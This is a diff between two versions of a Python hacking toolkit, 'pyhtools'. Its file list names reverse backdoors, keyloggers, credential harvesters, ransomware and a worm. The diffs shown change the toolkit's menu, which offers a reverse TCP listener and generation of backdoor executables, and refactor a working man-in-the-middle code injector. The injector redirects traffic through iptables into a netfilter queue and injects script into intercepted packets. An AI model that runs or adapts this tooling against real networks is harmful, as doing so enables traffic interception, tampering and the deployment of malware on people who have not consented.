# Comparing `tmp/pyhtools-2.2.2.tar.gz` & `tmp/pyhtools-2.2.3.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "pyhtools-2.2.2.tar", max compression
+gzip compressed data, was "pyhtools-2.2.3.tar", max compression
```

## Comparing `pyhtools-2.2.2.tar` & `pyhtools-2.2.3.tar`

### file list

```diff
@@ -1,72 +1,71 @@
--rw-r--r--   0        0        0     1071 2023-04-29 18:57:51.844475 pyhtools-2.2.2/LICENSE
--rw-r--r--   0        0        0     6823 2023-04-29 18:57:51.848475 pyhtools-2.2.2/README.md
--rw-r--r--   0        0        0        0 2023-04-29 18:57:51.852475 pyhtools-2.2.2/pyhtools/UI/__init__.py
--rw-r--r--   0        0        0      283 2023-04-29 18:57:51.852475 pyhtools-2.2.2/pyhtools/UI/colors.py
--rw-r--r--   0        0        0     5616 2023-04-29 18:57:51.852475 pyhtools-2.2.2/pyhtools/UI/functions.py
--rw-r--r--   0        0        0        0 2023-04-29 18:57:51.852475 pyhtools-2.2.2/pyhtools/__init__.py
--rw-r--r--   0        0        0      162 2023-04-29 19:22:01.890916 pyhtools-2.2.2/pyhtools/__main__.py
--rw-r--r--   0        0        0        0 2023-04-29 18:57:51.852475 pyhtools-2.2.2/pyhtools/attackers/Android/__init__.py
--rw-r--r--   0        0        0     2728 2023-04-29 18:57:51.852475 pyhtools-2.2.2/pyhtools/attackers/Android/forensics/data_harvestor.py
--rw-r--r--   0        0        0        0 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/Android/mitm/__init__.py
--rw-r--r--   0        0        0     4887 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/Android/mitm/cert_pin.py
--rw-r--r--   0        0        0      406 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/Android/mitm/utils.py
--rw-r--r--   0        0        0        0 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/Network/__init__.py
--rw-r--r--   0        0        0     4981 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/Network/arpspoofer.py
--rw-r--r--   0        0        0     4272 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/Network/code_injector.py
--rw-r--r--   0        0        0     3479 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/Network/dnsspoofer.py
--rw-r--r--   0        0        0     4584 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/Network/downloads_replacer.py
--rw-r--r--   0        0        0     3802 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/Network/machngr.py
--rw-r--r--   0        0        0     2215 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/Network/network_jammer.py
--rw-r--r--   0        0        0     1996 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/Network/nwscan.py
--rw-r--r--   0        0        0     2579 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/Network/pkt_sniffer.py
--rw-r--r--   0        0        0     5348 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/Network/tcp_proxy.py
--rw-r--r--   0        0        0        0 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/__init__.py
--rw-r--r--   0        0        0     4669 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/attackers.py
--rw-r--r--   0        0        0        0 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/web/__init__.py
--rw-r--r--   0        0        0        0 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/web/api/__init__.py
--rw-r--r--   0        0        0     5035 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/web/api/discover.py
--rw-r--r--   0        0        0     2212 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/web/enumerate.py
--rw-r--r--   0        0        0     1918 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/web/get_forms.py
--rw-r--r--   0        0        0     1096 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/web/login_guesser.py
--rw-r--r--   0        0        0     2755 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/web/spider.py
--rw-r--r--   0        0        0     3188 2023-04-29 18:57:51.856475 pyhtools-2.2.2/pyhtools/attackers/web/utils.py
--rw-r--r--   0        0        0        0 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/attackers/web/vuln_scanner/__init__.py
--rw-r--r--   0        0        0     6262 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/attackers/web/vuln_scanner/scanner.py
--rw-r--r--   0        0        0     2092 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/attackers/web/vuln_scanner/sqli.py
--rw-r--r--   0        0        0     2810 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/attackers/web/vuln_scanner/vuln_scanner.py
--rw-r--r--   0        0        0        0 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/detectors/__init__.py
--rw-r--r--   0        0        0     1681 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/detectors/arp_spoof_detector.py
--rw-r--r--   0        0        0     2061 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/exec_generator.py
--rw-r--r--   0        0        0        0 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/__init__.py
--rw-r--r--   0        0        0     3352 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/backdoor/ssh/backdoor.py
--rw-r--r--   0        0        0     2272 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/backdoor/ssh/handler.py
--rw-r--r--   0        0        0     1850 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/data_harvesters/credential_harvester.py
--rw-r--r--   0        0        0     1632 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/data_harvesters/ssh_cred_harvester.py
--rw-r--r--   0        0        0     4868 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/data_harvesters/telegram_data_harvester.py
--rw-r--r--   0        0        0     2230 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/data_harvesters/wireless_password_harvester.py
--rw-r--r--   0        0        0        0 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/installer/__init__.py
--rw-r--r--   0        0        0     1566 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/installer/cert.py
--rw-r--r--   0        0        0        0 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/keylogger/__init__.py
--rw-r--r--   0        0        0     2599 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/keylogger/keylogger.py
--rw-r--r--   0        0        0        0 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/HTTP/__init__.py
--rw-r--r--   0        0        0     1338 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/HTTP/backdoor.py
--rw-r--r--   0        0        0     1147 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/HTTP/listener.py
--rw-r--r--   0        0        0        0 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/TCP/__init__.py
--rw-r--r--   0        0        0     5247 2023-04-29 18:57:51.860475 pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/TCP/listener.py
--rw-r--r--   0        0        0     5727 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/TCP/reverse_backdoor.py
--rw-r--r--   0        0        0        0 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/__init__.py
--rw-r--r--   0        0        0        0 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/ssh/__init__.py
--rw-r--r--   0        0        0     5015 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/ssh/backdoor.py
--rw-r--r--   0        0        0     4349 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/malwares/telegram_remote_code_executor/TelegramRemoteCodeExecutor.py
--rw-r--r--   0        0        0        0 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/malwares/telegram_remote_code_executor/__init__.py
--rw-r--r--   0        0        0     2589 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/malwares/utils.py
--rw-r--r--   0        0        0        0 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/ransomwares/__init__.py
--rw-r--r--   0        0        0     1074 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/ransomwares/dmsec/HowToUse.md
--rw-r--r--   0        0        0        0 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/ransomwares/dmsec/__init__.py
--rw-r--r--   0        0        0     2130 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/ransomwares/dmsec/decrypter.py
--rw-r--r--   0        0        0     2242 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/ransomwares/dmsec/encrypter.py
--rw-r--r--   0        0        0        0 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/worms/__init__.py
--rw-r--r--   0        0        0     3857 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/evil_files/worms/dir_cloner.py
--rw-r--r--   0        0        0      528 2023-04-29 18:57:51.864475 pyhtools-2.2.2/pyhtools/utils.py
--rw-r--r--   0        0        0     1585 2023-04-29 19:22:01.894916 pyhtools-2.2.2/pyproject.toml
--rw-r--r--   0        0        0     8813 1970-01-01 00:00:00.000000 pyhtools-2.2.2/PKG-INFO
+-rw-r--r--   0        0        0     1076 2023-05-20 06:53:14.382185 pyhtools-2.2.3/LICENSE
+-rw-r--r--   0        0        0     6823 2023-05-20 06:53:14.386185 pyhtools-2.2.3/README.md
+-rw-r--r--   0        0        0        0 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/UI/__init__.py
+-rw-r--r--   0        0        0      283 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/UI/colors.py
+-rw-r--r--   0        0        0     6409 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/UI/functions.py
+-rw-r--r--   0        0        0        0 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/__init__.py
+-rw-r--r--   0        0        0      201 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/__main__.py
+-rw-r--r--   0        0        0        0 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/Android/__init__.py
+-rw-r--r--   0        0        0     2728 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/Android/forensics/data_harvestor.py
+-rw-r--r--   0        0        0        0 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/Android/mitm/__init__.py
+-rw-r--r--   0        0        0     4887 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/Android/mitm/cert_pin.py
+-rw-r--r--   0        0        0      406 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/Android/mitm/utils.py
+-rw-r--r--   0        0        0        0 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/Network/__init__.py
+-rw-r--r--   0        0        0     6629 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/Network/arpspoofer.py
+-rw-r--r--   0        0        0     4867 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/Network/code_injector.py
+-rw-r--r--   0        0        0     3726 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/Network/dnsspoofer.py
+-rw-r--r--   0        0        0     5075 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/Network/downloads_replacer.py
+-rw-r--r--   0        0        0     4580 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/Network/machngr.py
+-rw-r--r--   0        0        0     2552 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/Network/network_jammer.py
+-rw-r--r--   0        0        0     2177 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/Network/nwscan.py
+-rw-r--r--   0        0        0     2831 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/Network/pkt_sniffer.py
+-rw-r--r--   0        0        0     7372 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/Network/tcp_proxy.py
+-rw-r--r--   0        0        0        0 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/__init__.py
+-rw-r--r--   0        0        0     4669 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/attackers.py
+-rw-r--r--   0        0        0        0 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/web/__init__.py
+-rw-r--r--   0        0        0        0 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/web/api/__init__.py
+-rw-r--r--   0        0        0     6643 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/web/api/discover.py
+-rw-r--r--   0        0        0     3012 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/web/enumerate.py
+-rw-r--r--   0        0        0     2141 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/web/get_forms.py
+-rw-r--r--   0        0        0     1357 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/web/login_guesser.py
+-rw-r--r--   0        0        0     3403 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/web/spider.py
+-rw-r--r--   0        0        0     4529 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/web/utils.py
+-rw-r--r--   0        0        0        0 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/web/vuln_scanner/__init__.py
+-rw-r--r--   0        0        0     2901 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/web/vuln_scanner/__main__.py
+-rw-r--r--   0        0        0     7036 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/web/vuln_scanner/scanner.py
+-rw-r--r--   0        0        0     2132 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/attackers/web/vuln_scanner/sqli.py
+-rw-r--r--   0        0        0        0 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/detectors/__init__.py
+-rw-r--r--   0        0        0     1681 2023-05-20 06:53:14.386185 pyhtools-2.2.3/pyhtools/detectors/arp_spoof_detector.py
+-rw-r--r--   0        0        0     4132 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/exec_generator.py
+-rw-r--r--   0        0        0        0 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/malwares/__init__.py
+-rw-r--r--   0        0        0     3352 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/malwares/backdoor/ssh/backdoor.py
+-rw-r--r--   0        0        0     2272 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/malwares/backdoor/ssh/handler.py
+-rw-r--r--   0        0        0     1850 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/malwares/data_harvesters/credential_harvester.py
+-rw-r--r--   0        0        0     1632 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/malwares/data_harvesters/ssh_cred_harvester.py
+-rw-r--r--   0        0        0     4868 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/malwares/data_harvesters/telegram_data_harvester.py
+-rw-r--r--   0        0        0     2230 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/malwares/data_harvesters/wireless_password_harvester.py
+-rw-r--r--   0        0        0        0 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/malwares/installer/__init__.py
+-rw-r--r--   0        0        0     1566 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/malwares/installer/cert.py
+-rw-r--r--   0        0        0        0 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/malwares/keylogger/__init__.py
+-rw-r--r--   0        0        0     2599 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/malwares/keylogger/keylogger.py
+-rw-r--r--   0        0        0        0 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/malwares/reverse_backdoor/HTTP/__init__.py
+-rw-r--r--   0        0        0     1338 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/malwares/reverse_backdoor/HTTP/backdoor.py
+-rw-r--r--   0        0        0     1147 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/malwares/reverse_backdoor/HTTP/listener.py
+-rw-r--r--   0        0        0        0 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/malwares/reverse_backdoor/TCP/__init__.py
+-rw-r--r--   0        0        0     5247 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/malwares/reverse_backdoor/TCP/listener.py
+-rw-r--r--   0        0        0     5727 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/malwares/reverse_backdoor/TCP/reverse_backdoor.py
+-rw-r--r--   0        0        0        0 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/malwares/reverse_backdoor/__init__.py
+-rw-r--r--   0        0        0        0 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/malwares/reverse_backdoor/ssh/__init__.py
+-rw-r--r--   0        0        0     5015 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/malwares/reverse_backdoor/ssh/backdoor.py
+-rw-r--r--   0        0        0     4349 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/malwares/telegram_remote_code_executor/TelegramRemoteCodeExecutor.py
+-rw-r--r--   0        0        0        0 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/malwares/telegram_remote_code_executor/__init__.py
+-rw-r--r--   0        0        0     2589 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/malwares/utils.py
+-rw-r--r--   0        0        0        0 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/ransomwares/__init__.py
+-rw-r--r--   0        0        0        0 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/ransomwares/dmsec/__init__.py
+-rw-r--r--   0        0        0     2130 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/ransomwares/dmsec/decrypter.py
+-rw-r--r--   0        0        0     2242 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/ransomwares/dmsec/encrypter.py
+-rw-r--r--   0        0        0        0 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/worms/__init__.py
+-rw-r--r--   0        0        0     3857 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/evil_files/worms/dir_cloner.py
+-rw-r--r--   0        0        0      528 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyhtools/utils.py
+-rw-r--r--   0        0        0     1822 2023-05-20 06:53:14.390185 pyhtools-2.2.3/pyproject.toml
+-rw-r--r--   0        0        0     9119 1970-01-01 00:00:00.000000 pyhtools-2.2.3/PKG-INFO
```

### Comparing `pyhtools-2.2.2/LICENSE` & `pyhtools-2.2.3/LICENSE`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 MIT License
 
-Copyright (c) 2022 Dhrumil Mistry
+Copyright (c) 2020-2023 Dhrumil Mistry
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
 in the Software without restriction, including without limitation the rights
 to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 copies of the Software, and to permit persons to whom the Software is
 furnished to do so, subject to the following conditions:
```

### Comparing `pyhtools-2.2.2/README.md` & `pyhtools-2.2.3/README.md`

 * *Files identical despite different names*

### Comparing `pyhtools-2.2.2/pyhtools/UI/functions.py` & `pyhtools-2.2.3/pyhtools/UI/functions.py`

 * *Files 22% similar despite different names*

```diff
@@ -1,36 +1,49 @@
 from asyncio.exceptions import CancelledError
 from prettytable import PrettyTable
-from pyhtools.UI.colors import BRIGHT_RED, BRIGHT_WHITE, BRIGHT_YELLOW, BACK_RED_BRIGHT_YELLOW, RESET_COLORS
+from pyhtools.UI.colors import BRIGHT_RED, BRIGHT_WHITE, BRIGHT_YELLOW, RESET_COLORS
 from pyhtools.evil_files.malwares.utils import send_mail
 
 
 import pyfiglet
 import os
 import sys
 import pyhtools.attackers.attackers as attacker
 import pyhtools.evil_files.malwares.reverse_backdoor.TCP.listener as listener
 
-__version = '2.1.0'
+__version = '2.2.2'
 
 def clrscr():
+    '''Clears UI screen
+    
+    Args:
+        None
+
+    Returns:
+        None
+    '''
     if os.name == 'nt':
         os.system('cls')
     elif os.name == 'posix':
         os.system('clear')
 
 
 def banner():
-    '''
-    prints PyHTools Banner
+    '''prints PyHTools Banner on UI Screen
+
+    Args:
+        None
+
+    Returns:
+        None
     '''
     clrscr()
     print(BRIGHT_YELLOW + pyfiglet.figlet_format('PyHTools'))
     print(BRIGHT_YELLOW + '+' + '-'*42 + '+')
-    print(BRIGHT_WHITE + f'| written by dmdhrumilmistry\tpht v{__version} |')
+    print(BRIGHT_WHITE + f'| written by dmdhrumilmistry               |')
     print(BRIGHT_YELLOW + '+' + '-'*42 + '+')
 
 
 def print_help():
     '''
     prints commands with their brief description.
     '''
@@ -39,15 +52,15 @@
     help = PrettyTable(['Command', 'Description'])
     help.align['Command'] = 'c'
     help.align['Description'] = 'l'
     # help.add_row(['',''])
 
     help.add_row(['clear', 'clear console'])
     help.add_row(['help', 'display help table'])
-    help.add_row(['close pht', 'exit PyHackingTools'])
+    help.add_row(['close', 'exit PyHackingTools'])
 
     help.add_row(['machngr', 'change mac address of the network interface'])
     help.add_row(['arpspoofer', 'spoof the target by arp poisoning'])
     help.add_row(['nwscan', 'scan for ip range in the network'])
 
     help.add_row(
         ['webspider', 'maps all the links which are related to root url on the website'])
@@ -56,88 +69,123 @@
     help.add_row(
         ['webcrawlsubdom', 'scan for valid subdomains of the website using a wordlist'])
     help.add_row(['weblogin', 'bruteforce webpage login'])
     help.add_row(['webvulnscan', 'scan for vulnerabilities on the website'])
 
     # help.add_row(['',''])
 
-    help.add_row(['listener', 'start listener on specific LHOST and LPORT'])
+    help.add_row(['listener', 'start reverse TCP listener on specific LHOST and LPORT'])
     help.add_row(['sendmail', 'send mail to specific email address'])
 
     help.add_row(
         ['gen exe', 'generate executables of reverse backdoor, keylogger, etc.'])
 
     print(help)
 
 
 def send_mail_to(email, password, receiver, subject, body) -> bool:
-    '''
-    send mail
+    '''sends mail to receivers
+
+    Args:
+        email (str): email of the sender
+        password (str): password of sender
+        receiver (str): receviever's email address
+        subject (str): email subject
+        body (str): email text content
+
+    Returns:
+        bool: returns True if email was sent successfully, else returns False
     '''
     print(BRIGHT_WHITE + '[*] Sending email...')
     msg = f'Subject: {subject}\n{body}'
     if send_mail(email, receiver, password, msg):
         print(BRIGHT_YELLOW + '[\u2714] Mail Sent')
     else:
         print(BRIGHT_RED + '[\u274c] Unable to send mail.')
 
 
 def listener_option():
-    '''
-    executes commands to run listener option.
+    '''accepts inputs from user to run reverse TCP backdoor and starts listeners
+
+    Args:
+        None
+
+    Returns:
+        None
     '''
     host = input('[+] LHOST : ')
     port = int(input('[+] LPORT : '))
     lsnr = listener.Listener(host, port)
     lsnr.run()
 
 
 def sendmail_option():
-    '''
-    executes commands to run send mail option.
+    '''Accepts inputs from user to send email
+
+    Args:
+        None
+
+    Returns:
+        None
     '''
     email = input('[+] gmail acc : ')
     password = input('[+] password : ')
     print('[!] if you want to send mail to yourself enter "self" (without quotes)')
     receiver = input('[+] email to : ')
     if receiver.lower() == 'self':
         receiver = email
     subject = input('[+] subject : ')
     body = input('[+] body : ')
     send_mail_to(email, password, receiver, subject, body)
 
 
 def machngr_option():
-    '''
-    executes commands to change mac address
+    '''executes commands to change mac address
+    
+    Args:
+        None
+
+    Returns:
+        None
     '''
     attacker.mac_changer()
 
 
 def generate_executable():
-    '''
-    executes commands to generate executables   
+    '''executes commands to generate executables. Work in Progress
+
+    Args:
+        None
+
+    Returns:
+        None
     '''
     print(BRIGHT_YELLOW +
           '[-] Currently this feature is under test... Will update soon...')
     print(BRIGHT_WHITE +
           '[*] You can use scripts from malwares to manually generate evil files...')
 
 
 async def run():
-    '''
-    start PyHTools
+    '''starts PyHTools UI, interacts with user and executes appropriate 
+    functions based on command 
+
+    Args:
+        None
+
+    Returns:
+        None
     '''
     try:
         while True:
-            cmd = input(BACK_RED_BRIGHT_YELLOW + 'pyhtools >>' +
+            cmd = input(BRIGHT_RED + 'pyhtools >>' +
                         RESET_COLORS + ' ').lower().strip()
 
             # BASIC UI COMMANDS
-            if cmd == 'close pht':
+            if cmd == 'close':
                 break
 
             elif cmd == 'clear':
                 clrscr()
 
             elif cmd == 'help':
                 print_help()
```

### Comparing `pyhtools-2.2.2/pyhtools/attackers/Android/forensics/data_harvestor.py` & `pyhtools-2.2.3/pyhtools/attackers/Android/forensics/data_harvestor.py`

 * *Files identical despite different names*

### Comparing `pyhtools-2.2.2/pyhtools/attackers/Android/mitm/cert_pin.py` & `pyhtools-2.2.3/pyhtools/attackers/Android/mitm/cert_pin.py`

 * *Files identical despite different names*

### Comparing `pyhtools-2.2.2/pyhtools/attackers/Network/code_injector.py` & `pyhtools-2.2.3/pyhtools/attackers/Network/code_injector.py`

 * *Files 10% similar despite different names*

```diff
@@ -1,62 +1,85 @@
 #########################################################################
 # Author : Dhrumil Mistry
 #########################################################################
 
 
 #########################################################################
 # If you encounter Import error after installing netfilter use command 
+# sudo apt install libnfnetlink-dev libnetfilter-queue-dev
 # sudo pip3 install --upgrade -U git+https://github.com/kti/python-netfilterqueue 
 #########################################################################
 
 from subprocess import call
 import netfilterqueue
 import scapy.all as scapy
 from re import search, sub
 from pyhtools.UI.colors import *
 
 
 ############################### Functions ############################### 
 def forward_packets():
-    '''
-    configures the mitm for incoming request packets
+    '''configures the mitm for incoming request packets
     into a queue.
+
+    Args:
+        None
+
+    Returns:
+        None
     '''
 
     call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
     # for local host
     call('sudo iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
     call('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
     
 
 
 def reset_config():
-    '''
-    resets the configurations changed while exectution of the program to 
-    its original configuration.
+    '''resets the configurations changed while exectution of the program to 
+    its original configuration
+
+    Args:
+        None
+
+    Returns:
+        None
     '''
     call('sudo iptables --flush', shell=True)
 
 
 def set_load(packet, load):
-    '''
-    sets the packet raw layer load value to the passed load value
+    '''sets the packet raw layer load value to the passed load value
+
+    Args:
+        packet (scapy.IP): scapy IP packet
+        load (bytes): payload data as bytes
+
+    Returns:
+        scapy.IP: returns packet with load
     '''
     packet[scapy.Raw].load = load
     del packet[scapy.IP].len
     del packet[scapy.IP].chksum
     del packet[scapy.TCP].chksum
 
     return packet
 
 
 def process_packet(packet):
     '''
-    process received packet, everytime a packet is received and
+    process received packet, everytime a packet is received 
+    and inject malicous code into the packet
 
+    Args:
+        packet (scapy.IP): IP packet from netfilterqueue
+
+    Returns:
+        None
     '''
     global inj_code
     scapy_pkt = scapy.IP(packet.get_payload())
     if scapy_pkt.haslayer(scapy.Raw):
 
         load = scapy_pkt[scapy.Raw].load
         tampered_load = b'unchanged load'
@@ -93,40 +116,49 @@
             new_payload = set_load(scapy_pkt, tampered_load)
             packet.set_payload(bytes(new_payload))
             print(new_payload.show())
 
     packet.accept()
     
 
-############################### Main ############################### 
+def run(): 
+    '''Start Code Injector
+    
+    Args:
+        None
 
-inj_code = '<script>alert("Payload Added!!")</script>'
+    Returns: 
+        None
+    '''
+    reset_config()
 
-reset_config()
+    print(BRIGHT_YELLOW + '[*] Starting Code injector...')
+    print(BRIGHT_YELLOW + '[*] configuring packet receiver...')
 
-print(BRIGHT_YELLOW + '[*] Starting Code injector...')
-print(BRIGHT_YELLOW + '[*] configuring packet receiver...')
+    forward_packets()
+    print(BRIGHT_YELLOW + '[*] packet receiver configured successfully.\n')
 
-forward_packets()
-print(BRIGHT_YELLOW + '[*] packet receiver configured successfully.\n')
+    print(BRIGHT_YELLOW + '[*] Creating Queue to start receiving packets.')
+    try:
+        queue = netfilterqueue.NetfilterQueue()
+        queue.bind(0, process_packet)
+        queue.run()
 
-print(BRIGHT_YELLOW + '[*] Creating Queue to start receiving packets.')
-try:
-    queue = netfilterqueue.NetfilterQueue()
-    queue.bind(0, process_packet)
-    queue.run()
+    except OSError as e:
+        print(BRIGHT_RED + '[-] Run script with root priviliges.')
+        print(e)
 
-except OSError as e:
-    print(BRIGHT_RED + '[-] Run script with root priviliges.')
-    print(e)
